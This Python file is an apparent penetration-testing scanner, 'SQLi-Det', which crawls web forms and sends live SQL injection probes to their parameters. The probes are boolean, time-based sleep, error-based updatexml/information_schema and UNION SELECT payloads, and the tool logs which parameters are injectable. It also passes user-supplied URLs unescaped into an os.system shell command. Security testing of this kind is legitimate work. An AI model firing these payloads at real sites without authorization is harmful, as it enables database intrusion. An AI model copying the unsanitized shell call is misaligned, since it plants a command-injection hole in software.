import requests
import sys
import getopt
import json
import numpy as np
import time
import os
import difflib


def banner():
    print("\n***************************************")
    print("* SQli-Det                              *")
    print("***************************************\n")

def usage():
    print("[Info] Usage:")
    print("-f: run full automatic pen-test with crawler")
    print('example: py SQLi_Det.py -f \n')
    print("-s: run automatic pen-test on a single page with crawler")
    print('example: py SQLi_Det.py -u "http://localhost/dashboard/var/www/sqli-labs-master/Less-1/" \n')
    print("-i: run half-auto pen-test with the file of the response to inject")
    print('example: py SQLi_Det.py -i post.txt \n')
    print("-u: run basic pen-test on a specific GET method URL")
    print('example: py SQLi_Det.py -u "http://localhost/dashboard/var/www/sqli-labs-master/Less-1/?id=1&name=admin" \n')
    print("-h: print the help document")
    print('example: py SQLi_Det.py -h \n')

def url_process(file):
    try:
        f = open(file, )
        dictsp = json.load(f)
    except:
        print("[Error] No crawl result was found! Please check whether the spider.json file is in a correct format!")
        sys.exit()

    print("[Info] Found input vectors:")

    for i in dictsp:
        print(i)

    f.close()

    f = open(file, 'w')
    f.write('')
    f.close()

    return dictsp

def requst_process(file):
    try:
        with open(file, "r", encoding='utf-8') as f:
            lines = f.readlines()
    except:
        print("[Error] File not exists")
        sys.exit()

    method = str()
    data = dict()
    headers = dict()
    count = len(lines)

    for line in lines:
        if count == len(lines):
            l = line.strip().split(" ")
            method = l[0]
            if method == "GET":
                print("[Warning] You are dealing with GET method request, please use -u command instead!\n")
                usage()
                sys.exit()

            url = l[1]
        elif count == 1:
            ori_data = line.strip().split("&")
            for d in ori_data:
                items = d.split("=")
                data[items[0]] = items[1]
        else:
            if line != "\n":
                header = line.strip().split(": ")
                headers[header[0]] = header[1]

        count -= 1

    ori_url = headers["Origin"] + url

    f.close()
    return method, ori_url, headers, data

def data_process(url):
    data = dict()
    U = url.split("?")
    # ori_url = U[0]
    datas = U[1].split("&")

    for d in datas:
        r = d.split("=")
        data[r[0]] = r[1]

    return data

def start(argv):
    banner()
    if len(sys.argv) < 2:
        usage()
        sys.exit()
    try:
        opts, args = getopt.getopt(argv, "i:u:s:fh")
    except getopt.GetoptError:
        print("[Error] Error in arguments")
        sys.exit()
    try:
        josnF = open("lib/injections.json",)
        dictio = json.load(josnF)
        josnF.close()
    except (RuntimeError):
        print("[Error] " + RuntimeError)
        print("[Error] Failed open the injector dictionary!")
        sys.exit()

    for opt, arg in opts:
        if opt == '-u':
            url = arg

            if "?" not in url:
                print("[Error] Invalid GET method URL!")
                sys.exit()

            cost = connection_test(url)
            data = data_process(url)
            print("[Info] Would you like to send a Cookie? (y/N)")
            sendC = input()
            if sendC == "y" or sendC == "Y":
                print("[Info] Example Cookie: PHPSESSID=nxxrp4mk2xxxnrxxxp4r8ebp48")
                print("[Info] Please input your Cookie:")
                cookie_raw = input().split("=")
                cookie_dict = dict()
                cookie_dict[cookie_raw[0]] = cookie_raw[1]
                launcher(cost, opt, url, cookie_dict, dictio, "GET", data)
            else:
                launcher(cost, opt, url, None, dictio, "GET", data)

        elif opt == '-s':
            url = arg

            print("[Info] Start crawling")
            os.system("scrapy crawl crawler -a start_urls=" + url
                      + " -a allowed_domains=" + url.split("://")[1]
                      + " --nolog -t json -O temp/spider.json")

            print("----------------------------------")
            dictsp = url_process("temp/spider.json")
            cookies = dict()
            for line in dictsp:
                if "cookies" in line:
                    cookies_list = line["cookies"]
                    for c in cookies_list:
                        cs = c.split("=")
                        c_key = cs[0]
                        c_val = cs[1]
                        cookies[c_key] = c_val

            for form in dictsp:
                if "cookies" not in form:
                    url = form["form"]
                    method = form["method"]
                    loc_url = form["location_url"]

                    if method == None:
                        method = "GET"

                    if url == None:
                        url = loc_url

                    data = dict()
                    for d in form['name']:
                        if "=" not in d:
                            data[d] = "1"
                        else:
                            ds = d.split("=")
                            if len(ds) > 1:
                                data[ds[0]] = ds[1]
                            else:
                                data[ds[0]] = "1"

                    cost = connection_test(loc_url)
                    launcher(cost, opt, url, cookies, dictio, method, data, loc_url)

        elif opt == '-f':
            print("[Info] Start crawling")
            os.system("scrapy crawl crawler " + "-a mode=" + opt
                       + " --nolog -t json -O temp/spider.json")

            print("----------------------------------")
            dictsp = url_process("temp/spider.json")
            cookies = dict()
            for line in dictsp:
                if "cookies" in line:
                    cookies_list = line["cookies"]
                    for c in cookies_list:
                        cs = c.split("=")
                        c_key = cs[0]
                        c_val = cs[1]
                        cookies[c_key] = c_val

            for form in dictsp:
                if "cookies" not in form:
                    url = form["form"]
                    method = form["method"]
                    loc_url = form["location_url"]

                    if method == None:
                        method = "GET"

                    if url == None:
                        url = loc_url

                    data = dict()
                    for d in form['name']:
                        if "=" not in d:
                            data[d] = "1"
                        else:
                            ds = d.split("=")
                            if len(ds) > 1:
                                data[ds[0]] = ds[1]
                            else:
                                data[ds[0]] = "1"

                    cost = connection_test(loc_url)
                    launcher(cost, opt, url, cookies, dictio, method, data, loc_url)

        elif opt == '-i':
            file = "temp/" + arg

            try:
                method, url, headers, data = requst_process(file)
            except (RuntimeError):
                print(RuntimeError)
                print("Failed open response file!")
                sys.exit()

            cost = connection_test(url)
            launcher(cost, opt, url, None, dictio, method, data, None, headers)

        elif opt == "-h":
            usage()
            sys.exit()

def connection_test(url):
    start = time.time()

    try:
        res = requests.get(url, allow_redirects=False, timeout=5000)
        if res.status_code not in (200, 201, 301, 302):
            print("[Error] Connection Failed! Status code:", res.status_code)
            sys.exit()
    except:
        print("[Error] Connection Failed, Please check your network!!")
        sys.exit()

    end = time.time()
    cost = end - start
    return cost

def launcher (cost, opt, url, cookies, dictio, method, data=None, loc_url=None, headers=None):
    print("\n[Info] Detection Start:")
    msg = "Detection start with {} method.\n".format(opt)
    msg += "----------------------------------\n"

    if loc_url != None:
        print("[Info] Check on", loc_url)
        print("[Info] On action:", url)
        msg += "Location URL: {}\n".format(loc_url)
        msg += "Request URL: {}\n".format(url)
    else:
        print("[Info] Check on", url)
        msg += "Location URL: {}\n".format(loc_url)
        msg += "Request URL: {}\n".format(url)
        msg += "Result:\n"

    print("[Info] Request frequency:", "1/" + str(cost) + "s")

    if cookies == None:
        cookies = dict()

    write_report(msg)
    symbols = dict()
    count = len(data)
    allow_re = False
    data_copy = data.copy()

    for key in data:
        result, injector_found, is_sleep, has_redirect = \
            checkInjectable(cost, opt, method, url, cookies, dictio, data, key, headers)

        if is_sleep and has_redirect:
            print("[Info] Redirect Check!")
            result2, injector_found2, is_sleep2, has_redirect2 = \
                checkInjectable(cost, opt, method, url, cookies, dictio, data, key, headers, True)

            if injector_found2:
                is_sleep = is_sleep2
                allow_re = True

        if injector_found:
            if is_sleep:
                symbols[key] = (result, ["sleep"])
            else:
                symbols[key] = (result, ["bool", "sleep"])

                if not allow_re:
                    pos_new = result + " AND/OR if(1=1,sleep(5),1) AND " + dictio[result][0] + "1 -- - / " + dictio[result][1] + "1"
                    data_copy[key] = data[key] + pos_new
                    if method == "GET":
                        new_pos_url = new_get_url(url + "?", data_copy)
                    else:
                        new_pos_url = data_copy[key]
                    msg = "\t[{}] is time based blind injectable with [{}]\n".format(key, result)
                    msg += "\tExample injection: {}\n\n".format(new_pos_url)
                    write_report(msg)

            if count != 1 and opt != "-f":
                print("[Info] Would you like to check other input factors? (y/N)")
                c = input()
                if c == 'Y' or c == 'y':
                    pass
                else:
                    break

        count -= 1

    if len(symbols) > 0:
        for s in symbols:
            print("[Info] Start Error base injection check")
            error_inject = \
                checkInjectable_error(cost, url, cookies, symbols[s][0], dictio, method, headers, data, s)
            if error_inject:
                symbols[s][1].append("error")

            print("[Info] Start Union select injection check")
            union_inject, column_number = \
                checkInjectable_union(cost, url, cookies, symbols[s][0], dictio, method, headers, data, s, allow_re)
            if union_inject:
                symbols[s][1].append("union")

        print('\n[Info] Found injector: ')
        print("---------------")
        print(symbols)
        print("Detection Finished!")
        msg = "----------------------------------\n"
        msg += "Detection Finished!\n\n\n"
        write_report(msg)
    else:
        print("This page is not injectable!")
        msg = "----------------------------------\n"
        msg += "This page is not injectable! Detection Finished!\n\n\n"
        write_report(msg)

def checkInjectable(cost, opt, method, url, cookies, dictio, data, key, headers=None, allow_re=False):
    success = False
    max_iter = 2
    no_or = dict()
    data_copy = data.copy()
    ori_url = url
    has_redirect = False
    is_dynamic = False
    ori_res_without_dyn = str()

    while max_iter != 0 and not success:
        if opt == "-u":
            url = ori_url.split("?")[0] + "?"
            time.sleep(cost)
            ori_res = requests.get(ori_url, cookies=cookies, allow_redirects=allow_re, timeout=5000)

            if max_iter == 2:
                time.sleep(cost)
                ori_res2 = requests.get(ori_url, cookies=cookies, allow_redirects=allow_re, timeout=5000)
        else:
            if method.upper() == "GET" or method == "":
                url = ori_url + "?"
                new_url = new_get_url(url, data)
                method = "GET"
                time.sleep(cost)
                ori_res = requests.get(new_url, cookies=cookies, allow_redirects=allow_re, timeout=5000)

                if max_iter == 2:
                    time.sleep(cost)
                    ori_res2 = requests.get(new_url, cookies=cookies, allow_redirects=allow_re, timeout=5000)
            elif headers != None:
                time.sleep(cost)
                ori_res = requests.request(method, url, cookies=cookies, headers=headers, data=data, allow_redirects=allow_re, timeout=5000)

                if max_iter == 2:
                    time.sleep(cost)
                    ori_res2 = requests.request(method, url, cookies=cookies, headers=headers, data=data, allow_redirects=allow_re, timeout=5000)
            else:
                time.sleep(cost)
                ori_res = requests.request(method, url, cookies=cookies, data=data, allow_redirects=allow_re, timeout=5000)

                if max_iter == 2:
                    time.sleep(cost)
                    ori_res2 = requests.request(method, url, cookies=cookies, data=data, allow_redirects=allow_re, timeout=5000)

        print("[Info] Start to check the injection string on", "[" + key + "]")
        if ori_res.status_code not in (200, 201, 301, 302):
            print("[Info] Request failed, status code:" + str(ori_res.status_code))
            return None, False, False, False

        if ori_res.status_code == 302:
            has_redirect = True

        if max_iter == 2:
            is_dynamic, ori_res_without_dyn = find_dynamic_from_ori(ori_res, ori_res2)

        for prefix in dictio:
            postfix_int = 0
            no_or[prefix] = False
            for postfix in dictio[prefix]:

                if postfix_int == 0:
                    endfix = "1 -- -"
                else:
                    endfix = "1"

                neg_new = prefix + " AND " + postfix + "-" + endfix
                data_copy[key] = data[key] + neg_new
                if method == "GET":
                    new_neg_url = new_get_url(url, data_copy)
                    time.sleep(cost)
                    try:
                        neg_res = requests.get(new_neg_url, cookies=cookies, allow_redirects=allow_re, timeout=5000)
                    except:
                        print("[Warning] Connection slow, please wait!")
                        time.sleep(60)
                        neg_res = requests.get(new_neg_url, cookies=cookies, allow_redirects=allow_re, timeout=5000)

                elif headers != None:
                    time.sleep(cost)
                    try:
                        neg_res = requests.request(method, url, cookies=cookies, headers=headers, data=data_copy, allow_redirects=allow_re, timeout=5000)
                    except:
                        print("[Warning] Connection slow, please wait!")
                        time.sleep(60)
                        neg_res = requests.request(method, url, cookies=cookies, headers=headers, data=data_copy, allow_redirects=allow_re, timeout=5000)
                else:
                    try:
                        time.sleep(cost)
                        neg_res = requests.request(method, url, cookies=cookies, data=data_copy, allow_redirects=allow_re, timeout=5000)
                    except:
                        print("[Warning] Connection slow, please wait!")
                        time.sleep(60)
                        neg_res = requests.request(method, url, cookies=cookies, data=data_copy, allow_redirects=allow_re,
                                                   timeout=5000)

                pos_new = prefix + " AND " + postfix + endfix
                data_copy[key] = data[key] + pos_new
                if method == "GET":
                    new_pos_url = new_get_url(url, data_copy)
                    time.sleep(cost)
                    try:
                        pos_res = requests.get(new_pos_url, cookies=cookies, allow_redirects=allow_re, timeout=5000)
                    except:
                        print("[Warning] Connection slow, please wait!")
                        time.sleep(60)
                        pos_res = requests.get(new_pos_url, cookies=cookies, allow_redirects=allow_re, timeout=5000)
                elif headers != None:
                    new_pos_url = data_copy[key]
                    time.sleep(cost)
                    try:
                        pos_res = requests.request(method, url, cookies=cookies, headers=headers, data=data_copy, allow_redirects=allow_re, timeout=5000)
                    except:
                        print("[Warning] Connection slow, please wait!")
                        time.sleep(60)
                        pos_res = requests.request(method, url, cookies=cookies, headers=headers, data=data_copy, allow_redirects=allow_re, timeout=5000)
                else:
                    new_pos_url = data_copy[key]
                    try:
                        time.sleep(cost)
                        pos_res = requests.request(method, url, cookies=cookies, data=data_copy, allow_redirects=allow_re, timeout=5000)
                    except:
                        print("[Warning] Connection slow, please wait!")
                        time.sleep(60)
                        pos_res = requests.request(method, url, cookies=cookies, data=data_copy, allow_redirects=allow_re,
                                                   timeout=5000)

                ori_vs_neg_res = response_compare(is_dynamic, ori_res_without_dyn, ori_res, neg_res, neg_new)
                ori_vs_pos_res = response_compare(is_dynamic, ori_res_without_dyn, ori_res, pos_res, pos_new)
                pos_vs_neg_res = response_compare(is_dynamic, ori_res_without_dyn, neg_res, pos_res, neg_new, pos_new)

                if not ori_vs_neg_res \
                    and ori_vs_pos_res \
                    and not pos_vs_neg_res:

                    success = True
                    result = prefix
                    result_url = new_pos_url
                    break

                elif not ori_vs_neg_res \
                    and not ori_vs_pos_res:

                    no_or[prefix] = True

                postfix_int += 1

        max_iter -= 1

    if success:
        print("[Info]", "["+key+"]", "is boolean based blind injectable with", "["+result+"]")
        print("[Info] Example:", result_url)
        msg = "\t[{}] is boolean based blind injectable with [{}]\n".format(key, result)
        msg += "\tExample injection: {}\n\n".format(result_url)
        write_report(msg)

        return result, success, False, has_redirect

    print("[Info] Cannot find any injection string")
    print("[Info] Try OR statement")
    if not success:
        for prefix in dictio:
            if not no_or[prefix]:
                postfix_int = 0
                for postfix in dictio[prefix]:

                    if postfix_int == 0:
                        endfix = "1 -- -"
                    else:
                        endfix = "1"

                    pos_new = prefix + " OR " + postfix + endfix
                    data_copy[key] = data[key] + pos_new
                    php_error = ori_res.content.count("PHP Error".encode())

                    if method == "GET":
                        new_pos_url = new_get_url(url, data_copy)
                        time.sleep(cost)
                        try:
                            pos_res = requests.get(new_pos_url, cookies=cookies, allow_redirects=allow_re, timeout=5000)
                        except:
                            print("[Warning] Connection slow, please wait!")
                            time.sleep(60)
                            pos_res = requests.get(new_pos_url, cookies=cookies, allow_redirects=allow_re, timeout=5000)
                    elif headers != None:
                        new_pos_url = data_copy[key]
                        time.sleep(cost)
                        try:
                            pos_res = requests.request(method, url, cookies=cookies, headers=headers, data=data_copy, allow_redirects=allow_re, timeout=5000)
                        except:
                            print("[Warning] Connection slow, please wait!")
                            time.sleep(60)
                            pos_res = requests.request(method, url, cookies=cookies, headers=headers, data=data_copy, allow_redirects=allow_re, timeout=5000)
                    else:
                        new_pos_url = data_copy[key]
                        try:
                            time.sleep(cost)
                            pos_res = requests.request(method, url, cookies=cookies, data=data_copy, allow_redirects=allow_re, timeout=5000)
                        except:
                            print("[Warning] Connection slow, please wait!")
                            time.sleep(60)
                            pos_res = requests.request(method, url, cookies=cookies, data=data_copy, allow_redirects=allow_re,
                                                       timeout=5000)

                    if not (response_compare(is_dynamic, ori_res_without_dyn, ori_res, pos_res, pos_new)) \
                        and check_error(pos_res.content, php_error):
                        success = True
                        result = prefix
                        result_url = new_pos_url
                        break

                    postfix_int += 1

    if success:
        print("[Info]", "["+key+"]", "is boolean based blind injectable with", "["+result+"]")
        print("[Info] Example:", result_url)
        msg = "\t[{}] is boolean based blind injectable with [{}]\n".format(key, result)
        msg += "\tExample injection: {}\n\n".format(result_url)
        write_report(msg)
        return result, success, False, has_redirect

    print("[Info] Cannot find any injection string")
    print("[Info] Try SLEEP method")
    if not success and not allow_re:
        times = dict()
        payload = dict()
        for prefix in dictio:
            postfix_int = 0
            for postfix in dictio[prefix]:

                if postfix_int == 0:
                    endfix = "1 -- -"
                else:
                    endfix = "1"

                pos_new = prefix + " AND if(1=1,sleep(5),1) AND " + postfix + endfix
                data_copy[key] = data[key] + pos_new

                start = time.time()
                if method == "GET":
                    new_pos_url = new_get_url(url, data_copy)
                    time.sleep(cost)
                    pos_res = requests.get(new_pos_url, cookies=cookies, allow_redirects=False)
                elif headers != None:
                    time.sleep(cost)
                    pos_res = requests.request(method, url, cookies=cookies, headers=headers, data=data_copy, allow_redirects=False)
                else:
                    time.sleep(cost)
                    pos_res = requests.request(method, url, cookies=cookies, data=data_copy, allow_redirects=False)

                end = time.time()
                cost_time = end - start
                times[prefix] = cost_time
                payload[cost_time] = data_copy[key]
                if cost_time > 5:
                    break
                postfix_int += 1

        max_key = max(times, key=times.get)
        std_with_max = np.std(list(times.values()))
        max_time = times.pop(max_key)
        std_without_max = np.std(list(times.values()))

        if abs(std_with_max - std_without_max) >= 1:
            success = True
            result = max_key
            data_copy[key] = payload[max_time]
            if method == "GET":
                new_pos_url = new_get_url(url, data_copy)
            else:
                new_pos_url = data_copy[key]

    if success:
        print("[Info] [" + key + "] is time based blind injectable with [" + result + "]")
        print("[Info] Example:", new_pos_url)
        msg = "\t[{}] is time based blind injectable with [{}]\n".format(key, result)
        msg += "\tExample injection: {}\n\n".format(new_pos_url)
        write_report(msg)
        return result, success, True, has_redirect

    print("[Info] Cannot find any injection string")
    print("[Info] Try SLEEP method with OR")
    if not success and not allow_re:
        times = dict()
        payload = dict()
        for prefix in dictio:
            postfix_int = 0
            for postfix in dictio[prefix]:

                if postfix_int == 0:
                    endfix = "1 -- -"
                else:
                    endfix = "1"

                pos_new = prefix + " OR if(1=1,sleep(5),1) AND " + postfix + endfix
                data_copy[key] = data[key] + pos_new

                start = time.time()
                if method == "GET":
                    new_pos_url = new_get_url(url, data_copy)
                    time.sleep(cost)
                    pos_res = requests.get(new_pos_url, cookies=cookies, allow_redirects=False)
                elif headers != None:
                    time.sleep(cost)
                    pos_res = requests.request(method, url, cookies=cookies, headers=headers, data=data_copy, allow_redirects=False)
                else:
                    time.sleep(cost)
                    pos_res = requests.request(method, url, cookies=cookies, data=data_copy, allow_redirects=False)

                end = time.time()
                cost_time = end - start
                times[prefix] = cost_time
                payload[cost_time] = data_copy[key]
                if cost_time > 5:
                    break

                postfix_int += 1

        max_key = max(times, key=times.get)
        std_with_max = np.std(list(times.values()))
        max_time = times.pop(max_key)
        std_without_max = np.std(list(times.values()))

        if abs(std_with_max - std_without_max) >= 1:
            success = True
            result = max_key
            data_copy[key] = payload[max_time]
            if method == "GET":
                new_pos_url = new_get_url(url, data_copy)
            else:
                new_pos_url = data_copy[key]

    if success:
        print("[Info] [" + key + "] is time based blind injectable with [" + result + "]")
        print("[Info] Example:", new_pos_url)
        msg = "\t[{}] is time based blind injectable with [{}]\n".format(key, result)
        msg += "\tExample injection: {}\n\n".format(new_pos_url)
        write_report(msg)
        return result, success, True, has_redirect

    return None, success, False, has_redirect

def new_get_url(url, data):
    count = 1
    new_url = url
    for key in data:
        if count != len(data):
            new_url += key + "=" + data[key] + "&"
        else:
            new_url += key + "=" + data[key]

        count += 1

    return new_url

def find_dynamic_from_ori(ori_res, ori_res2):
    is_dynamic = False
    content1 = ori_res.text
    content2 = ori_res2.text
    diffff = list(difflib.Differ().compare(content1.splitlines(), content2.splitlines()))
    for s in diffff:
        if s[0:2] == "- ":
            is_dynamic = True
            sss = s[2:]
            content1 = content1.replace(sss, str())

    return is_dynamic, content1

def response_compare(is_dynamic, ori_res_without_dyn, res1, res2, inject_string1, inject_string2=None):
    content1 = res1.text
    content2 = res2.text

    if inject_string2 == None:
        content2 = content2.replace(inject_string1, str())
    else:
        content1 = content1.replace(inject_string1, str())
        content2 = content2.replace(inject_string2, str())

    if is_dynamic:
        if inject_string2 != None:
            diffff = list(difflib.Differ().compare(content1.splitlines(), ori_res_without_dyn.splitlines()))
            for s in diffff:
                if "- " in s:
                    sss = s.split("- ")[1]
                    content1 = content1.replace(sss, str())
        else:
            content1 = ori_res_without_dyn

        diffff = list(difflib.Differ().compare(content2.splitlines(), ori_res_without_dyn.splitlines()))
        for s in diffff:
            if "- " in s:
                sss = s.split("- ")[1]
                content2 = content2.replace(sss, str())

        content1 = content1.replace("\n", str(), -1)
        content2 = content2.replace("\n", str(), -1)

    return content1 == content2

def check_error(response, php_error):
    new_php_error = response.count("PHP Error".encode())
    if new_php_error != php_error:
        return False

    error_list = ["Data truncated for column", "Cannot add or update a child", "error in your SQL syntax", "Duplicate entry", "in 'order clause'"]
    for e in error_list:
        if e.encode() in response:
            return False

    return True

def checkInjectable_error(cost, url, cookies, symbol, dictio, method, headers, data, key):
    new_data = data.copy()
    error_raise = " and (select 1 from (select count(*),concat((select version() from information_schema.tables limit 0,1),floor(rand()*2)) as x from information_schema.tables group by x)as a) and updatexml(1,concat(0x5e,('You are injectable!!!'),0x5e),1) and "
    flag = "You are injectable!!!"

    if method.upper() == "GET" or method == "":
        ori_url = url.split("?")[0] + "?"
        postfix_int = 0
        for postfix in dictio[symbol]:
            if postfix_int == 0:
                endfix = "1 -- -"
            else:
                endfix = "1"

            new = symbol + error_raise + postfix + endfix
            new_data[key] = data[key] + new
            new_url = new_get_url(ori_url, new_data)
            time.sleep(cost)
            try:
                response = requests.get(new_url, cookies=cookies, timeout=5000, allow_redirects=False)
            except:
                print("[Warning] Connection slow, please wait!")
                time.sleep(60)
                response = requests.get(new_url, cookies=cookies, timeout=5000, allow_redirects=False)

            r_text = response.text.replace(new_data[key], str())
            if flag in r_text:
                print("[Info]", "[" + key + "]", "is error based injectable!")
                print("[Info] Example:", new_url)
                msg = "\t[{}] is error based injectable\n".format(key)
                msg += "\tExample injection: {}\n\n".format(new_url)
                write_report(msg)
                return True

            postfix_int += 1
    else:
        postfix_int = 0
        for postfix in dictio[symbol]:
            if postfix_int == 0:
                endfix = "1 -- -"
            else:
                endfix = "1"

            new_data[key] = data[key] + symbol + error_raise + postfix + endfix
            if headers != None:
                time.sleep(cost)
                try:
                    response = requests.request(method, url, cookies=cookies, headers=headers, data=new_data, allow_redirects=False, timeout=5000)
                except:
                    print("[Warning] Connection slow, please wait!")
                    time.sleep(60)
                    response = requests.request(method, url, cookies=cookies, headers=headers, data=new_data, allow_redirects=False, timeout=5000)
            else:
                time.sleep(cost)
                try:
                    response = requests.request(method, url, cookies=cookies, data=new_data, allow_redirects=False, timeout=5000)
                except:
                    print("[Warning] Connection slow, please wait!")
                    time.sleep(60)
                    response = requests.request(method, url, cookies=cookies, data=new_data, allow_redirects=False, timeout=5000)

            r_text = response.text.replace(new_data[key], str())
            if flag in r_text:
                print("[Info]", "[" + key + "]", "is error based injectable!")
                print("[Info] Example:", "[" + key + "]:", new_data[key])
                msg = "\t[{}] is error based injectable\n".format(key)
                msg += "\tExample injection: [{}]: {}\n\n".format(key, new_data[key])
                write_report(msg)
                return True

            postfix_int += 1

    return False

def checkInjectable_union(cost, url, cookies, symbol, dictio, method, headers, data, key=None, allow_re=False):
    column_count = 0
    columns = ""
    injectable = False
    new_data = data.copy()

    if method.upper() == "GET" or method == "":
        ori_url = url.split("?")[0] + "?"

        for i in range(1, 21):
            if i == 1:
                columns += "9527169"
            else:
                columns += ",9527169"

            new = symbol + " AND 1=-1 union select " + columns + " -- -"
            new_data[key] = data[key] + new
            new_url = new_get_url(ori_url, new_data)
            time.sleep(cost)
            try:
                new_res = requests.get(new_url, cookies=cookies, timeout=5000, allow_redirects=allow_re)
            except:
                print("[Warning] Connection slow, please wait!")
                time.sleep(60)
                new_res = requests.get(new_url, cookies=cookies, timeout=5000, allow_redirects=allow_re)

            column_count += 1

            r_text = new_res.text.replace(new_data[key], str())
            if "9527169" in r_text\
                    and "syntax to use near " + symbol + "union select 9527169" not in r_text:
                injectable = True
                break

        if injectable:
            print("[Info]", "[" + key + "]", "is union select injectable!")
            print("[Info] Example:", new_url)
            msg = "\t[{}] is union select injectable\n".format(key)
            msg += "\tExample injection: {}\n\n".format(new_url)
            write_report(msg)
            return True, column_count

    else:
        for i in range(1, 21):
            if i == 1:
                columns += "9527169"
            else:
                columns += ",9527169"

            new = symbol + " AND 1=-1 union select " + columns + " -- -"
            new_data[key] = data[key] + new
            if headers != None:
                time.sleep(cost)
                try:
                    new_res = requests.request(method, url, cookies=cookies, headers=headers, data=new_data, allow_redirects=allow_re, timeout=5000)
                except:
                    print("[Warning] Connection slow, please wait!")
                    time.sleep(60)
                    new_res = requests.request(method, url, cookies=cookies, headers=headers, data=new_data, allow_redirects=allow_re, timeout=5000)
            else:
                time.sleep(cost)
                try:
                    new_res = requests.request(method, url, cookies=cookies, data=new_data, allow_redirects=allow_re, timeout=5000)
                except:
                    print("[Warning] Connection slow, please wait!")
                    time.sleep(60)
                    new_res = requests.request(method, url, cookies=cookies, data=new_data, allow_redirects=allow_re, timeout=5000)

            column_count += 1

            r_text = new_res.text.replace(new_data[key], str())
            if "9527169" in r_text \
                    and "syntax to use near " + symbol + "union select 9527169" not in r_text:
                injectable = True
                break

        if injectable:
            print("[Info]", "[" + key + "]", "is union select injectable!")
            print("[Info] Example:", "[" + key + "]:", new_data[key])
            msg = "\t[{}] is union select injectable\n".format(key)
            msg += "\tExample injection: [{}]: {}\n\n".format(key, new_data[key])
            write_report(msg)
            return True, column_count

    return False, 0

def write_report(msg):
    f = open('report.txt', 'a+')
    f.write(msg)
    f.close()

if __name__ == "__main__":
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        msg = "SQL injector interrupted by user..!!\n\n\n"
        write_report(msg)
        print("SQL injector interrupted by user..!!")
